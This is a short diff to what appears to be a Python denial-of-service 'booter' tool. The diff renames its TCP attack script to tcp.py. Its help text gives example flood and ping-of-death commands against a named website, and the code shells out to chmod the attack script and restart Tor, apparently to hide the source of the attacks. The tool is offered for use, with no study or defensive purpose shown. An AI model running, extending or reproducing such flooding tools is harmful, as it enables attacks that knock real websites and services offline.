@@ -70,7 +70,7 @@ while not found:
 udp : type udp you'll understand what to do after
 
 tcp : type tcp hit enter then do attack commands
-      ex      (tcp www.eatmyass.com -p 80 -t 150)
+      ex      (tcp.py www.eatmyass.com -p 80 -t 150)
 
 pod : type pod hit enter then do attack commands
       ex (ping www.eatmyass.com -l 150)
@@ -81,7 +81,7 @@ warning : type warning says something important
 
 	if booter == "tcp" :
 		tcp = raw_input(G+"Gun\033[95m$h0t\033[95m/\033[92mtcp: \033[0m")
-		os.system("cd attacks && chmod +x tcp")
+		os.system("cd attacks && chmod +x tcp.py")
 		while True:
 			os.system("clear")
 			os.system("service tor restart")
